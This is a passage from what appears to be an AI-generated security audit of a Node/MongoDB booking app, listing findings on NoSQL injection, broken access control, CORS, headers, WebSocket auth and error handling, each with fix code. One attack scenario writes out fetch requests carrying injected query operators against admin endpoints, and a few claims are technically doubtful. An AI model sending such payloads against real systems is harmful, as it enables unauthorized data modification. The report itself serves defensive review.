      {success && (
        <div className="bg-green-50 border border-green-200 text-green-700 p-4 rounded mb-4">
          Password reset successful! Redirecting...
        </div>
      )}

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 p-4 rounded mb-4">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium mb-1">New Password</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-3 py-2 border rounded"
            required
          />
          <PasswordStrengthMeter password={password} />
        </div>

        <div>
          <label className="block text-sm font-medium mb-1">Confirm Password</label>
          <input
            type="password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            className="w-full px-3 py-2 border rounded"
            required
          />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full bg-amber-600 text-white py-2 px-4 rounded hover:bg-amber-700 disabled:opacity-50"
        >
          {loading ? 'Resetting...' : 'Reset Password'}
        </button>
      </form>
    </div>
  );
}
```

Add route:

```javascript
// user/src/routes/index.jsx or App.jsx
<Route path="/reset-password" element={<ResetPassword />} />
```

**Best Practice Recommendation:**
✅ Use cryptographically secure random tokens  
✅ Hash tokens using SHA-256 before storing  
✅ Set short expiration (1 hour maximum)  
✅ Send emails asynchronously to prevent timing attacks  
✅ Implement rate limiting on password reset endpoint  
✅ Log password reset events for audit trails  
✅ Require current password before allowing reset in authenticated context

---

### 8. 🔴 HIGH: Unvalidated ObjectId Strings (NoSQL Injection Risk)

**Vulnerability Name:** NoSQL Injection via Unvalidated ObjectId  
**CVSS Score:** 7.5 (High)

**Why It's Dangerous:**
- ObjectId validation not enforced in some routes
- Attacker can pass regex patterns or other operators
- MongoDB injection can return unauthorized data
- Access control can be bypassed

**Exact Location in Code:**

[backend/controllers/bookingController.js](backend/controllers/bookingController.js#L83):
```javascript
const actorId = resolveActorId(req.user);

// Later in filter construction
if (role === 'user') {
  if (useTypeSafeExpr) {
    filter.$expr = { $eq: [{ $toString: '$customerId' }, actorId] };
    // ❌ $toString conversion possible attack vector if actorId comes from user input
  }
}
```

[backend/routes/admin.js](backend/routes/admin.js#L63):
```javascript
router.put('/users/:id', updateUser); // :id not validated to be ObjectId
router.put('/bookings/:id', updateBooking); // Same issue
```

**Attack Scenario:**
```javascript
// Attacker sends crafted ObjectId that bypasses validation
fetch('https://trimly.com/api/admin/users/{"$ne":null}', {
  method: 'PUT',
  body: JSON.stringify({ status: 'active' })
})
// Could update all users instead of specific user

// Or via regex injection
fetch('https://trimly.com/api/admin/users/.*', {
  method: 'PUT',
  body: JSON.stringify({ isBlocked: true })
})
// Could block all users matching pattern
```

**Secure Fix with Code Example:**

Create ObjectId validation middleware:

```javascript
// backend/middlewares/objectIdMiddleware.js
const mongoose = require('mongoose');
const ErrorResponse = require('../utils/errorResponse');

/**
 * Validate that a parameter is a valid MongoDB ObjectId
 */
exports.validateObjectId = (...paramNames) => (req, res, next) => {
  for (const param of paramNames) {
    const value = req.params[param];
    
    if (!mongoose.Types.ObjectId.isValid(value)) {
      return next(new ErrorResponse(`Invalid ${param} format`, 400));
    }
  }
  
  next();
};

/**
 * Validate that request body IDs are valid ObjectIds
 */
exports.validateBodyObjectIds = (...fieldNames) => (req, res, next) => {
  for (const field of fieldNames) {
    const value = req.body[field];
    
    if (value && !mongoose.Types.ObjectId.isValid(value)) {
      return next(new ErrorResponse(`Invalid ${field} format`, 400));
    }
  }
  
  next();
};
```

Apply validation to routes:

```javascript
// backend/routes/admin.js
const { validateObjectId, validateBodyObjectIds } = require('../middlewares/objectIdMiddleware');

router.get('/users/:id', validateObjectId('id'), getUser);
router.put('/users/:id', validateObjectId('id'), updateUser);
router.delete('/users/:id', validateObjectId('id'), deleteUser);
router.patch('/users/:id/status', validateObjectId('id'), updateUser);

router.get('/bookings/:id', validateObjectId('id'), getBooking);
router.put('/bookings/:id', validateObjectId('id'), updateBooking);
router.delete('/bookings/:id', validateObjectId('id'), deleteBooking);

router.post('/bookings', validateBodyObjectIds('customerId', 'providerId', 'serviceId'), createBooking);
router.put('/bookings/:id', validateObjectId('id'), validateBodyObjectIds('providerId', 'serviceId'), updateBooking);
```

Add utility function to ensure ObjectId:

```javascript
// backend/utils/mongoUtils.js
const mongoose = require('mongoose');

/**
 * Convert string to ObjectId if valid, otherwise throw error
 */
exports.toObjectId = (value, fieldName = 'id') => {
  if (!mongoose.Types.ObjectId.isValid(value)) {
    throw new Error(`Invalid ${fieldName}`);
  }
  return new mongoose.Types.ObjectId(value);
};

/**
 * Safely compare two ObjectIds
 */
exports.objectIdEquals = (id1, id2) => {
  try {
    const oid1 = mongoose.Types.ObjectId(id1);
    const oid2 = mongoose.Types.ObjectId(id2);
    return oid1.equals(oid2);
  } catch {
    return false;
  }
};

/**
 * Validate array of ObjectIds
 */
exports.validateObjectIdArray = (ids, fieldName = 'ids') => {
  if (!Array.isArray(ids)) {
    throw new Error(`${fieldName} must be an array`);
  }
  
  return ids.filter(id => {
    if (!mongoose.Types.ObjectId.isValid(id)) {
      console.warn(`Invalid ObjectId in ${fieldName}: ${id}`);
      return false;
    }
    return true;
  }).map(id => new mongoose.Types.ObjectId(id));
};
```

Update booking controller:

```javascript
// backend/controllers/bookingController.js
const { toObjectId, objectIdEquals } = require('../utils/mongoUtils');

const buildScopedFilter = ({ role, actorId, status }) => {
  const filter = {};

  if (status) {
    filter.status = status;
  }

  if (!actorId) {
    return filter;
  }

  try {
    const userId = toObjectId(actorId, 'userId');
    
    if (role === 'user') {
      filter.customerId = userId;
    } else if (role === 'provider') {
      filter.providerId = userId;
    }
  } catch (error) {
    throw new Error('Invalid user ID format');
  }

  return filter;
};

exports.getBookingDetails = asyncHandler(async (req, res, next) => {
  try {
    const bookingId = toObjectId(req.params.id, 'bookingId');
    const booking = await Booking.findById(bookingId)
      .populate(BOOKING_POPULATE);

    if (!booking) {
      return next(new ErrorResponse('Booking not found', 404));
    }

    // Ownership check
    const userId = toObjectId(req.user.id, 'userId');
    const isOwner = 
      objectIdEquals(booking.customerId, userId) ||
      objectIdEquals(booking.providerId, userId) ||
      req.user.role === 'admin';

    if (!isOwner) {
      return next(new ErrorResponse('Not authorized to view this booking', 403));
    }

    res.status(200).json({
      success: true,
      message: 'Booking retrieved',
      data: booking
    });
  } catch (error) {
    return next(new ErrorResponse(error.message, 400));
  }
});
```

**Best Practice Recommendation:**
✅ Always validate ObjectIds before database queries  
✅ Use TypeScript with proper Type definitions for IDs  
✅ Implement a central ID validation utility  
✅ Never construct MongoDB operators from user input  
✅ Use Mongoose schema-level validation  
✅ Test NoSQL injection vectors in security tests

---

### 9. 🟠 HIGH: Missing Authentication & Authorization Checks

**Vulnerability Name:** Broken Access Control  
**CVSS Score:** 7.3 (High)

**Why It's Dangerous:**
- Some endpoints may be accessible without authentication
- Role checks might be bypassed
- Ownership validation might be skipped
- Users can access other users' resources

**Exact Location in Code:**

[backend/routes/bookings.js](backend/routes/bookings.js#L22):
```javascript
router.get('/:id', getBookingDetails); // ❌ No protect middleware!
// This route is missing protect middleware
```

[backend/routes/services.js](backend/routes/services.js):
```javascript
router.get('/', getServices); // OK - public listing
router.get('/:id', getServiceById); // OK - public detail
router.post('/', protect, onlyAdmin, createService); // OK - protected
```

Missing authentication on provider routes:

[backend/routes/provider.js](backend/routes/provider.js):
```javascript
router.get('/dashboard', getDashboard); // ❌ Missing protect!
router.get('/bookings', getBookings); // ❌ Missing protect!
router.patch('/:id/accept', acceptBooking); // ❌ Missing protect!
```

**Secure Fix with Code Example:**

Add `protect` middleware to all provider routes:

```javascript
// backend/routes/provider.js
const express = require('express');
const router = express.Router();
const {
  getDashboard,
  getBookings,
  acceptBooking,
  rejectBooking,
  // ... other controllers
} = require('../controllers/providerController');
const { protect } = require('../middlewares/authMiddleware');
const { onlyProvider } = require('../middlewares/roleMiddleware');

// ALL provider routes require authentication
router.use(protect);
router.use(onlyProvider);

// Provider dashboard
router.get('/dashboard', getDashboard);

// Bookings
router.get('/bookings', getBookings);
router.patch('/bookings/:id/accept', acceptBooking);
router.patch('/bookings/:id/reject', rejectBooking);

// ... rest of routes

module.exports = router;
```

Fix booking details route:

```javascript
// backend/routes/bookings.js
const express = require('express');
const router = express.Router();
const { 
  createBooking, 
  getBookings, 
  getBookingDetails,
  // ... other controllers
} = require('../controllers/bookingController');
const { protect } = require('../middlewares/authMiddleware');
const { checkBookingOwnership } = require('../middlewares/ownershipMiddleware');

// All booking routes require authentication
router.use(protect);

router.post('/', createBooking);
router.get('/', getBookings);

// ✅ Now has protect middleware
router.get('/:id', checkBookingOwnership, getBookingDetails);

module.exports = router;
```

Create authorization middleware for sensitive operations:

```javascript
// backend/middlewares/authorizationMiddleware.js
const ErrorResponse = require('../utils/errorResponse');

/**
 * Ensure user can only modify their own data
 */
exports.ensureOwnership = (resourceModel, paramName = 'id', userIdField = 'customerId') => {
  return async (req, res, next) => {
    try {
      const resourceId = req.params[paramName];
      const userId = req.user.id;

      const resource = await resourceModel.findById(resourceId);
      if (!resource) {
        return next(new ErrorResponse('Resource not found', 404));
      }

      // Admin can access anything
      if (req.user.role === 'admin') {
        return next();
      }

      // Check ownership
      const ownerId = resource[userIdField]?.toString();
      if (ownerId !== userId) {
        return next(new ErrorResponse('Not authorized for this resource', 403));
      }

      req.resource = resource;
      next();
    } catch (error) {
      next(new ErrorResponse('Authorization check failed', 500));
    }
  };
};

/**
 * Verify user is accessing only their own profile
 */
exports.protectProfileAccess = (req, res, next) => {
  const targetId = req.params.id;
  const userId = req.user.id;
  
  // Admin can access any profile
  if (req.user.role === 'admin') {
    return next();
  }

  // User can only access their own profile
  if (targetId && targetId !== userId) {
    return next(new ErrorResponse('You can only access your own profile', 403));
  }

  next();
};
```

**Best Practice Recommendation:**
✅ Apply `protect` middleware to all routes needing authentication  
✅ Apply role middleware to role-specific routes  
✅ Apply ownership checks to resource modification  
✅ Default to deny access, explicitly allow  
✅ Log unauthorized access attempts  
✅ Return 403 for access denial, never 404 (which reveals existence)

---

### 10. 🟠 HIGH: No Helmet/Security Headers on Frontend

**Vulnerability Name:** Missing CSP and Security Headers  
**CVSS Score:** 6.5 (Medium)

**Why It's Dangerous:**
- Frontend can be served with MIME sniffing enabled
- No CSP allows inline scripts and external script injection
- Vulnerable to clickjacking
- Reflected XSS via URL parameters

**Exact Location in Code:**

All three frontend apps (admin, user, provider) are Vite apps with no CSP or security headers configured.

[admin/vite.config.js](admin/vite.config.js):
```javascript
export default defineConfig({
  plugins: [react()],
  server: {
    port: 3000,
  },
  // ❌ No security headers configuration
});
```

**Secure Fix with Code Example:**

Create Vercel configuration with security headers:

```json
// admin/vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "geolocation=(), microphone=(), camera=()"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.trimly.com wss://api.trimly.com; frame-ancestors 'none';"
        }
      ]
    }
  ]
}
```

Or for local development, configure Express proxy:

```javascript
// vite.config.js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  server: {
    port: 3000,
    middlewareMode: true,
    headers: {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;"
    }
  },
  define: {
    'process.env': {}
  }
});
```

**Best Practice Recommendation:**
✅ Implement strict CSP on all frontends  
✅ Use Vercel deployments to enforce security headers  
✅ Remove `unsafe-inline` from CSP wherever possible  
✅ Test headers with securityheaders.com  
✅ Implement subresource integrity for external scripts

---

### 11. 🟠 HIGH: Socket.io Authentication is Weak

**Vulnerability Name:** Insufficient WebSocket Authentication  
**CVSS Score:** 6.8 (Medium)

**Why It's Dangerous:**
- Socket connections might bypass JWT validation
- Real-time data can be exposed to unauthorized users
- Attacker could listen to other users' booking updates
- WebSocket hijacking possible

**Exact Location in Code:**

[backend/config/socket.js](backend/config/socket.js#L5):
```javascript
io.use(async (socket, next) => {
  try {
    const rawToken = socket.handshake.auth?.token || 
                     socket.handshake.headers?.authorization || '';
    const token = rawToken.startsWith('Bearer ') ? 
                  rawToken.split(' ')[1] : rawToken;
    
    if (!token) {
      return next(new Error('Authentication error'));
    }
    // ❌ Token not properly decoded/validated here
    // Risk: Could accept any token format
```

**Secure Fix with Code Example:**

Implement secure Socket.io authentication:

```javascript
// backend/config/socket.js
const jwt = require('jsonwebtoken');
const User = require('../models/User');

/**
 * Socket.io authentication middleware
 */
const configureSocket = (io) => {
  // Authentication middleware for Socket.io connections
  io.use(async (socket, next) => {
    try {
      // Extract token from auth header or query
      const rawToken = socket.handshake.auth?.token ||
                       socket.handshake.headers?.authorization ||
                       socket.handshake.query?.token ||
                       '';
      
      // Validate Bearer format
      let token = rawToken;
      if (rawToken.startsWith('Bearer ')) {
        token = rawToken.substring(7);
      }
      
      if (!token || token.length < 20) { // JWT minimum length check
        return next(new Error('Invalid token format'));
      }

      // Verify JWT signature and expiration
      let decoded;
      try {
        decoded = jwt.verify(token, process.env.JWT_SECRET, {
          algorithms: ['HS256'], // Specify algorithm for security
          issuer: 'trimly-api',
          audience: 'trimly-client'
        });
      } catch (error) {
        if (error.name === 'TokenExpiredError') {
          return next(new Error('Token expired'));
        }
        return next(new Error('Invalid token signature'));
      }

      // Verify user exists and is active
      const user = await User.findById(decoded.id);
      if (!user) {
        return next(new Error('User not found'));
      }

      // Check account status
      if (user.isBlocked) {
        return next(new Error('Account is blocked'));
      }

      if (['inactive', 'suspended', 'rejected'].includes(user.status)) {
        return next(new Error('Account is not active'));
      }

      // Check provider approval
      if (user.role === 'provider' && !user.isApproved) {
        return next(new Error('Provider account is not approved'));
      }

      // Attach user to socket
      socket.user = {
        id: user._id.toString(),
        role: user.role,
        email: user.email,
        name: user.name
      };

      socket.userId = user._id.toString();
      socket.userRole = user.role;

      next();
    } catch (err) {
      console.error('[Socket Auth Error]', err.message);
      next(new Error('Authentication failed'));
    }
  });

  // Connection handler
  io.on('connection', (socket) => {
    console.log(`✓ User connected: ${socket.user.name} (${socket.user.role}) - ${socket.id}`);
    
    // Join user-specific room for targeted communication
    const userRoom = `user_${socket.userId}`;
    socket.join(userRoom);
    
    // Join role-specific room
    const roleRoom = `role_${socket.userRole}`;
    socket.join(roleRoom);

    // Broadcast user is online
    io.emit('user:online', {
      userId: socket.userId,
      role: socket.userRole,
      timestamp: new Date()
    });

    // Handle disconnection
    socket.on('disconnect', () => {
      console.log(`✗ User disconnected: ${socket.user.name} - ${socket.id}`);
      
      // Broadcast user is offline
      io.emit('user:offline', {
        userId: socket.userId,
        timestamp: new Date()
      });
    });

    // Handle errors
    socket.on('error', (error) => {
      console.error(`[Socket Error] ${socket.userId}:`, error);
    });
  });

  // Emit event only to specific user
  const emitToUser = (userId, event, data) => {
    io.to(`user_${userId}`).emit(event, data);
  };

  // Emit event to all users with role
  const emitToRole = (role, event, data) => {
    io.to(`role_${role}`).emit(event, data);
  };

  // Emit event to customer and assigned provider
  const emitToBooking = (booking, event, data) => {
    io.to(`user_${booking.customerId}`).emit(event, data);
    if (booking.providerId) {
      io.to(`user_${booking.providerId}`).emit(event, data);
    }
  };

  return { io, emitToUser, emitToRole, emitToBooking };
};

module.exports = configureSocket;
```

Update JWT signing to include audience/issuer:

```javascript
// backend/controllers/authController.js
const signToken = (user) => {
  if (!process.env.JWT_SECRET) {
    throw new Error('JWT_SECRET is not configured');
  }

  const token = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    {
      expiresIn: process.env.JWT_EXPIRES_IN || '7d',
      algorithm: 'HS256', // Specify algorithm
      issuer: 'trimly-api', // Identify token issuer
      audience: 'trimly-client' // Set audience
    }
  );

  return token;
};
```

Update frontend Socket.io connection:

```javascript
// admin/src/hooks/useSocket.js
import { useEffect } from 'react';
import { io } from 'socket.io-client';
import { getStoredToken } from '../utils/auth';

export const useSocket = () => {
  useEffect(() => {
    const token = getStoredToken();
    
    if (!token) {
      console.warn('No token available for Socket connection');
      return;
    }

    // Connect with authentication
    const socket = io(
      import.meta.env.VITE_API_BASE_URL?.replace('/api', '') || 
      'http://localhost:5000',
      {
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        reconnectionAttempts: 5,
        auth: {
          token: `Bearer ${token}` // Send token in auth header
        },
        query: {
          // Fallback for non-standard servers
          token: token
        },
        secure: true, // Require secure connection (WSS)
        rejectUnauthorized: true,
        transports: ['websocket', 'polling'] // WebSocket preferred
      }
    );

    socket.on('connect', () => {
      console.log('✓ Socket connected:', socket.id);
    });

    socket.on('connect_error', (error) => {
      console.error('✗ Socket connection error:', error.message);
      if (error.data?.message?.includes('authentication')) {
        // Token might be expired, clear and redirect to login
        clearAuthSession();
        window.location.href = '/login';
      }
    });

    socket.on('disconnect', (reason) => {
      console.log('✗ Socket disconnected:', reason);
    });

    return () => {
      socket.disconnect();
    };
  }, []);
};

export default useSocket;
```

**Best Practice Recommendation:**
✅ Always verify JWT on WebSocket connections  
✅ Check user status and permissions for each connection  
✅ Use secure WSS (WebSocket Secure) in production  
✅ Implement per-message authentication for sensitive events  
✅ Log all Socket connection attempts for audit trail  
✅ Implement connection rate limiting per user

---

### 12. 🟠 HIGH: Overly Permissive CORS Configuration

**Vulnerability Name:** Insecure CORS Configuration  
**CVSS Score:** 6.5 (Medium)

**Why It's Dangerous:**
- CORS with `*` origin allows any website to access the API
- Credentials sent across origins expose API to CSRF
- API can be called from malicious sites directly
- Data exposure to unauthorized third parties

**Exact Location in Code:**

[backend/server.js](backend/server.js#L33):
```javascript
app.use(cors()); // ❌ Too permissive! Uses default which allows all
// Also:
if (!origin || allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
  return callback(null, true);
}
// ❌ Logic allows wildcard
```

**Secure Fix with Code Example:**

Implement strict CORS:

```javascript
// backend/server.js
const cors = require('cors');

const allowedOrigins = [
  // Local development
  ...(process.env.NODE_ENV === 'development' ? [
    'http://localhost:3000',
    'http://localhost:3001',
    'http://localhost:3002',
    'http://localhost:5173',
    'http://localhost:5174',
    'http://localhost:5175'
  ] : []),
  // Production domains
  ...(process.env.PRODUCTION_URLS || '').split(',').map(url => url.trim()).filter(Boolean),
  // Fallback to environment variable
  ...((process.env.CLIENT_URLS || process.env.CLIENT_URL || '')
    .split(',')
    .map((origin) => origin.trim())
    .filter(Boolean)
    .filter(origin => origin && origin !== '*')) // Exclude wildcard
];

// Strict CORS configuration
const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps, curl requests)
    if (!origin) {
      return callback(null, true);
    }

    // Strict check: origin must be in allowlist
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    // Reject unknown origins
    console.warn(`CORS: Rejected request from origin: ${origin}`);
    return callback(new Error('Not allowed by CORS policy'));
  },
  
  // Only allow trusted credentials
  credentials: true,
  
  // Specify allowed methods
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  
  // Specify allowed headers
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  
  // Specify exposed headers
  exposedHeaders: ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset'],
  
  // Max age for preflight cache
  maxAge: 86400, // 24 hours
  
  // Handle preflight properly
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));

// Verify CORS configuration on startup
if (allowedOrigins.includes('*')) {
  console.error('⚠️  DANGEROUS: Wildcard origin in CORS allowed list!');
  console.error('   This allows any website to access your API');
}

console.log('✓ CORS allowed origins:', allowedOrigins);
```

Update Socket.io CORS:

```javascript
// backend/server.js
const io = configureSocket(require('socket.io')(server, {
  cors: {
    origin: (origin, callback) => {
      // Use same allowlist as HTTP CORS
      if (!origin) {
        return callback(null, true);
      }
      
      if (allowedOrigins.includes(origin)) {
        return callback(null, true);
      }
      
      console.warn(`Socket.io CORS: Rejected origin: ${origin}`);
      return callback(new Error('Not allowed'));
    },
    methods: ['GET', 'POST'],
    credentials: true,
    allowEIO3: true
  }
}));
```

Add environment validation:

```javascript
// backend/.env.example
# CORS Configuration
NODE_ENV=production
CLIENT_URLS=https://trimly.com,https://admin.trimly.com,https://provider.trimly.com
PRODUCTION_URLS=https://trimly.com,https://admin.trimly.com,https://provider.trimly.com

# Or individual URLs
FRONTEND_URL=https://trimly.com
ADMIN_URL=https://admin.trimly.com
PROVIDER_URL=https://provider.trimly.com
```

Add startup validation:

```javascript
// backend/server.js
// Validate CORS configuration on startup
const validateCorsConfig = () => {
  const urls = (process.env.CLIENT_URLS || process.env.CLIENT_URL || '')
    .split(',')
    .map(url => url.trim())
    .filter(Boolean);
  
  if (urls.length === 0 && process.env.NODE_ENV === 'production') {
    throw new Error(
      'FATAL: No CORS origins configured for production. ' +
      'Set CLIENT_URLS or CLIENT_URL environment variable.'
    );
  }
  
  if (urls.includes('*')) {
    throw new Error(
      'FATAL: Wildcard CORS origin is not allowed. ' +
      'Replace * with specific domains.'
    );
  }
  
  if (urls.some(url => url.includes('localhost'))) {
    console.warn('⚠️  WARNING: localhost CORS origin detected. ' +
                 'Remove for production deployment.');
  }
  
  console.log('✓ CORS configuration validated');
};

validateCorsConfig();
```

**Best Practice Recommendation:**
✅ Never use wildcard `*` origin in production  
✅ Explicitly list all trusted domains  
✅ Use separate CORS policies for different APIs  
✅ Implement origin validation before any processing  
✅ Log rejected CORS requests for monitoring  
✅ Rotate allowed origins regularly

---

### 13. 🟡 MEDIUM: Verbose Error Messages (Information Disclosure)

**Vulnerability Name:** Excessive Error Detail Exposure  
**CVSS Score:** 5.3 (Medium)

**Why It's Dangerous:**
- Error messages reveal database structure and field names
- Stack traces expose application internals
- Helps attackers understand system architecture
- Enables targeted attack planning

**Exact Location in Code:**

[backend/middlewares/errorHandler.js](backend/middlewares/errorHandler.js):
```javascript
res.status(error.statusCode || 500).json({
  success: false,
  message: error.message || 'Server Error'
  // ❌ Returns detailed error messages
});
```

**Attack Scenario:**
```javascript
// User sees:
// "duplicate field value entered"
// Reveals database unique constraints
// "Phone number already registered" (user enumeration)
// "CastError: Cast to ObjectId failed" (reveals MongoDB)
```

**Secure Fix with Code Example:**

Create environment-aware error handler:

```javascript
// backend/utils/errorResponse.js
class ErrorResponse extends Error {
  constructor(message, statusCode, internalMessage = null) {
    super(message);
    this.statusCode = statusCode;
    this.internalMessage = internalMessage || message;
  }
}

module.exports = ErrorResponse;

// backend/middlewares/errorHandler.js
const ErrorResponse = require('../utils/errorResponse');

const errorHandler = (err, req, res, next) => {
  let error = { ...err };
  error.message = err.message;

  // Log full error internally
  if (process.env.NODE_ENV === 'development') {
    console.error('[ERROR]', {
      message: err.message,
      stack: err.stack,
      code: err.code,
      path: req.path,
      method: req.method
    });
  } else {
    // Log to external service in production
    console.error(`[${new Date().toISOString()}] ${err.message}`);
    // TODO: Send to Sentry, LogRocket, etc.
  }

  // Mongoose bad ObjectId
  if (err.name === 'CastError') {
    const message = 'Resource not found';
    const internalMessage = `CastError: ${err.message}`;
    error = new ErrorResponse(message, 404, internalMessage);
  }

  // Mongoose duplicate key
  if (err.code === 11000) {
    const field = Object.keys(err.keyPattern || {})[0];
    
    // Friendly messages for known fields
    const friendlyMessages = {
      email: 'Email already registered',
      phone: 'Phone number already registered',
      username: 'Username already taken'
    };
    
    const message = friendlyMessages[field] || 'This value is already in use';
    error = new ErrorResponse(message, 409);
  }

  // Mongoose validation error
  if (err.name === 'ValidationError') {
    const message = 'One or more fields are invalid';
    const internalMessage = Object.values(err.errors)
      .map(val => val.message)
      .join(', ');
    error = new ErrorResponse(message, 400, internalMessage);
  }

  // JWT errors
  if (err.name === 'JsonWebTokenError') {
    // Don't reveal JWT details
    error = new ErrorResponse('Invalid authentication token', 401);
  }
  
  if (err.name === 'TokenExpiredError') {
    error = new ErrorResponse('Authentication token has expired', 401);
  }

  // Generic 500 for unknown errors
  if (!error.statusCode || error.statusCode >= 500) {
    // Generate error ID for support reference
    const errorId = `ERR_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    const response = {
      success: false,
      message: 'An unexpected error occurred. Please try again later.',
      ...(process.env.NODE_ENV === 'development' && {
        error: err.message,
        stack: err.stack
      })
    };
    
    // In production, include error ID for support
    if (process.env.NODE_ENV === 'production') {
      response.errorId = errorId;
      console.error(`[ERROR ID: ${errorId}]`, err);
    }
    
    return res.status(500).json(response);
  }

  // Public error response
  const response = {
    success: false,
    message: error.message || 'An error occurred'
  };

  // Development: include internal message
  if (process.env.NODE_ENV === 'development') {
    response.internalMessage = error.internalMessage;
    response.stack = err.stack;
  }

  res.status(error.statusCode || 500).json(response);
};

module.exports = errorHandler;
```

Add request logging middleware:

```javascript
// backend/middlewares/requestLogger.js
module.exports = (req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    const level = res.statusCode >= 500 ? 'ERROR' : 
                  res.statusCode >= 400 ? 'WARN' : 'INFO';
    
    if (process.env.NODE_ENV === 'production') {
      // Log to external service
      console.log(`[${level}] ${req.method} ${req.path} ${res.statusCode} ${duration}ms`);
    } else {
      // Verbose logging in development
      console.log(`[${level}] ${req.method} ${req.path} ${res.statusCode} ${duration}ms`, {
        ip: req.ip,
        userId: req.user?.id,
        body: req.body
      });
    }
  });
  
  next();
};
```

**Best Practice Recommendation:**
✅ Never return stack traces to clients  
✅ Use generic error messages for users  
✅ Log detailed errors server-side only  
✅ Use error IDs for user support reference  
✅ Implement centralized error logging (Sentry, LogRocket)  
✅ Sanitize error messages based on env (dev vs prod)

---

### 14. 🟡 MEDIUM: Large Request Body Limit

**Vulnerability Name:** Denial of Service via Large Payloads  
**CVSS Score:** 5.7 (Medium)

**Why It's Dangerous:**
- 8MB limit allows memory exhaustion attacks
- Large JSON payloads consume server resources
- Can crash or slow down application
- Enables ReDoS attacks in JSON parsing

**Exact Location in Code:**

[backend/server.js](backend/server.js#L34):
```javascript
app.use(express.json({ limit: '8mb' })); // ❌ Too large!
```

**Secure Fix with Code Example:**

```javascript
// backend/server.js
app.use(express.json({ 
  limit: '100kb', // Reduced from 8mb
  strict: true // Only parse arrays and objects
}));

app.use(express.urlencoded({ 
  limit: '100kb',
  extended: true 
}));

// Add payload size monitoring
app.use((req, res, next) => {
  const contentLength = parseInt(req.headers['content-length'] || 0);
  
  // Hard limit: reject requests over 200KB
  if (contentLength > 200 * 1024) {
    return res.status(413).json({
      success: false,
      message: 'Request payload too large'
    });
  }
  
  next();
});
```

**Best Practice Recommendation:**
✅ Set reasonable request size limits (50-100KB)  
✅ Monitor payload sizes in production  
✅ Implement payload validation before processing  
✅ Use streaming for large file uploads  
✅ Set timeouts on request processing

---

### 15. 🟡 MEDIUM: No Audit Logging

**Vulnerability Name:** Insufficient Logging and Monitoring  
**CVSS Score:** 5.4 (Medium)

**Why It's Dangerous:**
- No visibility into security incidents
- Cannot detect attack patterns
- Violates compliance requirements (GDPR, etc.)
- Difficult to investigate breaches
- No forensic evidence

**Secure Fix with Code Example:**

Create audit logging utility:

```javascript
// backend/utils/auditLogger.js
const fs = require('fs');
const path = require('path');

class AuditLogger {
  constructor() {
    this.logsDir = path.join(process.cwd(), 'logs');
    if (!fs.existsSync(this.logsDir)) {
      fs.mkdirSync(this.logsDir);
    }
  }

  async log(event) {
    const entry = {
      timestamp: new Date().toISOString(),
      ...event
    };

    // Console log for development
    if (process.env.NODE_ENV === 'development') {
      console.log('[AUDIT]', JSON.stringify(entry, null, 2));
    }

    // File log in production
    if (process.env.NODE_ENV === 'production') {
      const logFile = path.join(
        this.logsDir,
        `audit_${new Date().toISOString().split('T')[0]}.log`
      );
      
      fs.appendFileSync(logFile, JSON.stringify(entry) + '\n');
    }

    // Send to external service
    if (process.env.AUDIT_LOG_URL) {
      try {
        await fetch(process.env.AUDIT_LOG_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(entry)
        });
      } catch (error) {
        console.error('Failed to send audit log:', error.message);
      }
    }
  }

  async logAuthentication(event) {
    await this.log({
      category: 'AUTHENTICATION',
      ...event
    });
  }

  async logAuthorization(event) {
    await this.log({
      category: 'AUTHORIZATION',
      ...event
    });
  }

  async logDataModification(event) {
    await this.log({
      category: 'DATA_MODIFICATION',
      ...event
    });
  }

  async logSecurityEvent(event) {
    await this.log({
      category: 'SECURITY',
      ...event
    });
  }
}

module.exports = new AuditLogger();
```

Add audit logging to authentication:

```javascript
// backend/controllers/authController.js
const auditLogger = require('../utils/auditLogger');

exports.login = asyncHandler(async (req, res, next) => {
  const { phone, email, identifier, password } = req.body;
  const loginId = resolveLoginIdentifier({ identifier, phone, email });
  
  if (!loginId || !password) {
    await auditLogger.logAuthentication({
      event: 'LOGIN_INVALID_CREDENTIALS',
      ip: req.ip,
      userAgent: req.get('user-agent'),
      timestamp: new Date()
    });
    
    return next(new ErrorResponse('Phone/Email and password are required', 400));
  }

  const user = await findUserByLoginIdentifier(loginId);
  
  if (!user) {
